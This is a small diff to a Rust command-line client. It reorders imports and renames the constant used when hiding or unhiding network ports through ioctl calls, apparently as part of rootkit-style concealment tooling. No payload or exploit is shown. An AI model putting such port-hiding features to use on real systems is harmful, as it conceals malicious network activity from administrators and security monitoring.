@@ -1,9 +1,9 @@
 use {
     cli::*, 
-    log::*,  
+    log::error,  
+    clap::Parser,
     common::ioctls::*,
     utils::init_logger,
-    clap::Parser,
 };
 use modules::{
     misc::Misc,
@@ -134,9 +134,9 @@ fn main() {
         Commands::Port { hide, unhide, protocol, type_, port_number } => {
             let port = Port::new();
             if *hide {
-                port.hide_unhide_port(PORT, *protocol, *type_, *port_number, true);
+                port.hide_unhide_port(HIDE_PORT, *protocol, *type_, *port_number, true);
             } else if *unhide {
-                port.hide_unhide_port(PORT, *protocol, *type_, *port_number, false);
+                port.hide_unhide_port(HIDE_PORT, *protocol, *type_, *port_number, false);
             }
         }
 
